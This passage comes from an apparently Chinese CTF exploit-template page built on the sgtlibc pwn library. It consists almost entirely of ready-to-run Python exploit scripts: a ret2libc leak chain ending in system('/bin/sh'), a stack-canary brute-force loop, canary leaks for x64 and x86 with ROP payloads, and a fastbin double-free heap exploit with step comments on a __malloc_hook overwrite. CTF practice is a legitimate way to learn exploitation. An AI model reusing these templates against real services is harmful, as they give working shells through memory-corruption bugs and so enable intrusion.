    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> uc<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span> func<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span>b<span class="token string">'123'</span><span class="token punctuation">)</span>  <span class="token comment"># 此处因为样本read了2次，需要跳过第一次</span>
leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>


<span class="token comment"># libc = ELF('libc_buu-2.23_x86.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>


sl<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span>b<span class="token string">'123'</span><span class="token punctuation">)</span>  <span class="token comment"># 此处因为样本read了2次，需要跳过第一次</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="canary_brute_1396"></a>canary brute</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets<span class="token punctuation">.</span>gadgets_exploit <span class="token keyword">import</span> gadget_by_csu
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./fork'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> canary<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    sa<span class="token punctuation">(</span><span class="token string">'welcome'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    warning<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> b<span class="token string">'smash'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token comment"># success(data)</span>
    <span class="token comment"># interactive()</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> test<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            canary <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
success<span class="token punctuation">(</span>f<span class="token string">'canary:{canary.hex()}'</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="canaryx64by_simple_puts_leak_1443"></a>canary-x64-by_simple_puts_leak</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./babystack'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
main_addr <span class="token operator">=</span> <span class="token number">0x00400908</span>  <span class="token comment"># elf.symbols['main']</span>


canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span> canary<span class="token punctuation">,</span> <span class="token punctuation">(</span>b<span class="token string">''</span> <span class="token keyword">if</span> <span class="token operator">not</span> canary <span class="token keyword">else</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


sla<span class="token punctuation">(</span>b<span class="token string">'&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
se<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span>b<span class="token string">'&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>
<span class="token comment"># 此处是先获取canary，注意canary64位时候是 00开头的，需要将该00补上，否则将被截断无法回显</span>
canary <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'canary:{canary.hex()}'</span><span class="token punctuation">)</span>


main_addr <span class="token operator">=</span> <span class="token number">0x000000400908</span>  <span class="token comment"># elf.symbols['main']</span>
csu_init_addr <span class="token operator">=</span> <span class="token number">0x00400A30</span>  <span class="token comment"># elf.symbols['__libc_csu_init']</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span>   elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>main_addr<span class="token punctuation">]</span>
    <span class="token comment"># sla(b' input\n',payload)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token comment"># ru('joke')</span>
    <span class="token comment"># ru(fakeebp())  # 如果有输出则清空缓存</span>

    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
<span class="token comment"># leak('printf')</span>
leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('stdout')</span>
<span class="token comment"># leak('stdin')</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
<span class="token comment"># libc = ELF('libc_buu-2.23_x64.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="canaryx64bysimple_puts_leak_1531"></a>canary-x64-by-simple_puts_leak</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
<span class="token keyword">import</span> os

set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ex2'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">)</span>


plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>


canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span> canary<span class="token punctuation">,</span> <span class="token punctuation">(</span>b<span class="token string">''</span> <span class="token keyword">if</span> <span class="token operator">not</span> canary <span class="token keyword">else</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 此处是先获取canary，注意canary32位时候是 00开头的，需要将该00补上，否则将被截断无法回显</span>
data <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">'Hacker'</span><span class="token punctuation">,</span> data <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span>data <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'canary:{canary.hex()}'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak:{func}'</span><span class="token punctuation">)</span>
    <span class="token keyword">global</span> canary
    <span class="token comment"># 泄露libc</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>plt_write<span class="token punctuation">,</span> main_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token comment"># 如果是read的话则sa，如果是gets scanf的话则sl</span>
    se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span>b<span class="token string">'aabb'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 32位接收4个</span>
    data <span class="token operator">=</span> uc<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span> func<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
se<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span>b<span class="token string">'123'</span><span class="token punctuation">)</span> <span class="token comment"># 此处因为样本read了2次，需要跳过第一次</span>
leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>


<span class="token comment"># libc = ELF('libc_buu-2.23_x86.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>


data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment"># 再次利用payload，溢出执行system</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="fastbin_doublefree_leak_1628"></a>fastbin doublefree leak</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./fastbin'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    warning<span class="token punctuation">(</span>f<span class="token string">'add({size}):{data}'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    warning<span class="token punctuation">(</span>f<span class="token string">'delete({idx})'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Idx:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    warning<span class="token punctuation">(</span>f<span class="token string">'delete({idx})'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Idx:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>


SIZE_EXP <span class="token operator">=</span> <span class="token number">0x60</span>
POP_OFFSET <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 用于当onegadgets 不符合条件时候调整栈 ∈  # 0 2 4 6 8 11 12</span>
<span class="token comment"># 1. 申请一个大堆使得其可以进unsortbin 0x100</span>
<span class="token comment"># 2. 中间放一个小堆使得释放的时候不会被合并 0x20</span>
<span class="token comment"># 3. 申请2个SIZE_EXP的堆用于后续利用</span>
<span class="token comment"># 4. 删除大堆，此时大堆的头将变为堆管理器赋值的libc地址偏移</span>
<span class="token comment"># 4.1 使用`bins`查看该地址main_arean+xx偏移</span>
<span class="token comment"># 4.2 同时main_arena_malloc_hook和main_arena固定差-0x10</span>
<span class="token comment"># 4.3 libc_base = xx - 0x10 + main_arena_malloc_hook - libc.symbols['__malloc_hook']</span>
<span class="token comment"># 5. 释放A，释放B（防合并），释放A。使得A被double-free</span>
<span class="token comment"># 6. 再次申请A并将地址写为 libc_base + libc_0x7f_pos</span>
<span class="token comment"># 6.1 libc_0x7f_pos = libc.symbols['__malloc_hook'] - 0x28（魔术字） + 0x5（0x00007f 8位的后5位)</span>
<span class="token comment"># 7. 再次申请B，申请A。此时A的大小将变为 sizeof(CHUNK_HEAD) + SIZE_EXP</span>

<span class="token comment"># leak libc</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>  <span class="token comment"># 0</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>  <span class="token comment"># 1</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span>SIZE_EXP<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>  <span class="token comment"># 2-A</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span>SIZE_EXP<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'abitrary'</span><span class="token punctuation">)</span>  <span class="token comment"># 3-B</span>
<span class="token comment"># A-B-A</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
